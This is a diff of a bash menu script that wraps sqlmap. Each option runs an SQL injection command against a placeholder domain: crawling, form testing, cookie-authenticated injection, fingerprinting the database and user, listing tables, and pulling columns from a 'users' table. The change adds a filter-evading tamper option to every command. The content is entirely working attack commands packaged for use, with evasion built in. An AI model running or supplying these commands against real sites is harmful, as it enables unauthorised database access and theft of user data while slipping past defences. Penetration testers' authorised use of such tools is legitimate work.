@@ -34,51 +34,51 @@ do
 case $opt in
 "SQL Crawling")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --crawl=2 --random-agent
+command sqlmap -u https://enterdomainhere.com/ --crawl=2 --random-agent --tamper=space2comment
 ;;
 "SQL Crawling + Forms")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --forms --crawl=2 --random-agent
+command sqlmap -u https://enterdomainhere.com/ --forms --crawl=2 --random-agent --tamper=space2comment
 ;;
 "SQL GET Req.")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --random-agent
+command sqlmap -u https://enterdomainhere.com/ --random-agent --tamper=space2comment
 ;;
 "SQL POST Req.")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" --random-agent
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" --random-agent --tamper=space2comment
 ;;
 "SQL Auth Site")
 command clear
-command  sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --cookie="cookie1=val1;cookie2=val2" --random-agent
+command  sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --cookie="cookie1=val1;cookie2=val2" --random-agent --tamper=space2comment
 ;;
 "Collect DB & User")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --current-db --current-user --random-agent
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --current-db --current-user --random-agent --tamper=space2comment
 ;;
 "SQL & Tables")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --tables -D "testdb" --random-agent
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --tables -D "testdb" --random-agent --tamper=space2comment
 ;;
 "SQL User Columns")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --columns -T "users" --random-agent
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --columns -T "users" --random-agent --tamper=space2comment
 ;;
 "SQL mssql DB")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mssql" --random-agent
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mssql" --random-agent --tamper=space2comment
 ;;
 "SQL mysql DB")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mysql" --random-agent
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mysql" --random-agent --tamper=space2comment
 ;;
 "SQL oracle DB")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="oracle" --random-agent
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="oracle" --random-agent --tamper=space2comment
 ;; 
 "SQL postgres DB")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="postgres" --random-agent
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="postgres" --random-agent --tamper=space2comment
 ;;
 "Update Tool")
 command clear
